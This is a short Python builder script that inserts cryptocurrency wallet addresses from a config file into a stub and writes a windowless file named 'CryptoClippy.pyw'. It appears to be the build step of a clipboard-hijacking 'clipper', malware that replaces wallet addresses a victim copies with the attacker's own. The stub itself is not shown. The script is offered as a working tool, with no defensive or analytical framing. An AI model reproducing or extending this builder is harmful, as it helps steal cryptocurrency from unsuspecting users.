import os
import json
import re
import shutil
import subprocess

shutil.rmtree('temp', ignore_errors=True)
os.mkdir('temp')

with open('src\\stub.py', 'r', encoding='utf-8') as f:
    stub = f.read()

with open('config.json', 'r', encoding='utf-8') as f:
    config = dict(json.load(f))

for coin, address in config.items():
    stub = re.sub(rf'\|{coin}\|?', f'{address}', stub)

with open('temp\\CryptoClippy.pyw', 'w', encoding='utf-8') as f:
    f.write(stub)

subprocess.run(['explorer', os.path.abspath('temp')])